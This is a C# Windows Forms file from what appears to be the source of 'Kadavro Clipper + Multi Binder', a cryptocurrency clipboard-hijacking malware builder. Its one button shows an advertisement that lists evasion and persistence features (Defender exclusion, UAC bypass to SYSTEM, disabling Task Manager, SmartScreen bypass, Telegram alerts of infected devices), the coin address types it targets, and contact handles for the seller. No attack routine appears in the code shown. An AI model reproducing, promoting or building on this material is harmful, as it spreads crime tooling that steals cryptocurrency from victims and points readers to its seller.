using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KadavroClipperSource
{
    public partial class FrmMain: Form
    {
        public FrmMain()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Kadavro Clipper + Multi Binder\r\nFeatures:\r\n\r\n    Obfuscate Build\r\n    Defender Exclusion\r\n    Skip VMware, VPS, etc.\r\n    Bypass UAC -> LPE -> NT/SYSTEM\r\n    Startup\r\n    Disable Task Manager\r\n    Notification in Telegram of Infected Device\r\n    Icon and Properties Selection\r\n    Delete TimezoneID to Bypass SmartScreen\r\n\r\nSupported Addresses:\r\n\r\n    Bitcoin\r\n    Ethereum\r\n    USDT TRC20\r\n    Dogecoin\r\n    Litecoin\r\n    DashCoin\r\n    XMR (Monero)\r\n    Tezos\r\n    Algorand\r\n    Zcash\r\n    Cardano\r\n    Ripple\r\n    Polkadot\r\n    Ton (base64 decoded)\r\n    Filecoin\r\n    Cosmos\r\n    Kava\r\n    VeChain\r\n    Solana\r\n\r\nContact:\r\nTelegram: https://t.me/cl0akdev\r\nqTox: 0DF8A8515581B7BE24D2FC1F107AD38E20E6F26F6DF83E6C30AB49FF4707BD5720A0F4A38AB5");
        }
    }
}
